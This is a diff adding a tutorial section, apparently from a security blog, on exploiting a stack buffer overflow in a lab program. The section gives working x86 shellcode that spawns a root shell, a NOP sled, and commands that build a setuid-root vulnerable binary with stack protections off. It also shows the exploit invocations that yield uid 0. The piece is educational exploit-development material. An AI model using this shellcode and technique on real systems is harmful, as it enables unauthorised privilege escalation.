@@ -303,3 +303,67 @@ And sure enough the unreachable function is called.
 ## Executing user-defined code
 
 That was fun but it's a little limiting - ideally we'd like to execute arbitrary code. That is, point to an area of memory which contains something of ours.
+
+That 'something' is shellcode - it's essentially assembly instructions which for the most part will replace the current process with a shell (which will have the effective user's permissions). Writing shellcode is a bit of an artform and I used the one found "Hacking: The Art of Exploitation" . But where do we store it? It needs to be somewhere in memory and we want to point the return address to it.
+
+We could try storing it in the user-defined buffer but with only 8 bytes (and a few extra) it will be difficult. Instead we will look to store this in an environment variable. Indeed, those are stored on the stack:
+
+~~~ shell
+vagrant@vagrant:/tmp$ export SHELLCODE="shellcode goes here"
+vagrant@vagrant:/tmp$ gdb -q ./a.out
+Reading symbols from ./a.out...done.
+(gdb) break main
+Breakpoint 1 at 0x80484bb: file foo.c, line 22.
+(gdb) r
+Starting program: /tmp/a.out
+
+Breakpoint 1, main (argc=1, argv=0xffffdc14) at foo.c:22
+22        unsigned int result = 0xEEEEEEEE;
+(gdb) x/s *environ
+0xffffdd54:     "XDG_SESSION_ID=9"
+(gdb) x/16s 0xffffdd54
+0xffffdd54:     "XDG_SESSION_ID=9"
+0xffffdd65:     "SHELLCODE=shellcode goes here"
+0xffffdd83:     "TERM=screen-256color"
+0xffffdd98:     "SHELL=/bin/bash"
+[...]
+~~~
+
+We can see the first environment variable starts at `0xffffdd54` and our `SHELLCODE` one is right under.
+
+In practice we can't rely on our shellcode always being there. The stack will look a little different when the program is being run directly than through `gdb` and this  is where the `NOP` sled comes in. `NOP` is an instruction that does nothing - the program counter will keep incrementing until it finds a valid instruction. By prepending our shellcode with a `NOP` sled, we only need to point to anywhere in that sled to hit our goal.
+
+~~~ shell
+vagrant@vagrant:/tmp$ export SHELLCODE=$(perl -e 'print "\x90"x200 . "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80"')
+~~~
+
+Our `NOP` sled is 200 bytes long. And sure enough:
+
+~~~ shell
+vagrant@vagrant:/tmp$ gcc -g -m32 -fno-stack-protector -z execstack foo.c
+vagrant@vagrant:/tmp$ sudo chown root:root a.out
+vagrant@vagrant:/tmp$ sudo chmod u+s a.out
+vagrant@vagrant:/tmp$ id -u
+1000
+vagrant@vagrant:/tmp$ ./a.out $(perl -e 'print "U"x24 . "\x54\xdd\xff\xff"')
+# id -u
+0
+~~~
+
+Note the use of `z execstack` to make the stack executable - otherwise you'll get a segmentation fault.
+
+Usually we may not know how many bytes you need to set to overwrite the return address. When that's the case, the below can work just as well:
+
+~~~ shell
+vagrant@vagrant:/tmp$ ./a.out $(perl -e 'print "\x54\xdd\xff\xff"x40')
+# id -u
+0
+~~~
+
+That is, we plaster the return address all over the stack in the hope it gets processed correctly.
+
+## Conclusion
+
+Exploiting the stack through buffer overflows has become harder. A number of mitigation techniques (such as non-executable stack, stack protection and address space layout randomisation) are now turned on by default - though the idea is still very much applicable.
+
+The golden reference for this is Elias Levy's timeless article, [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html).
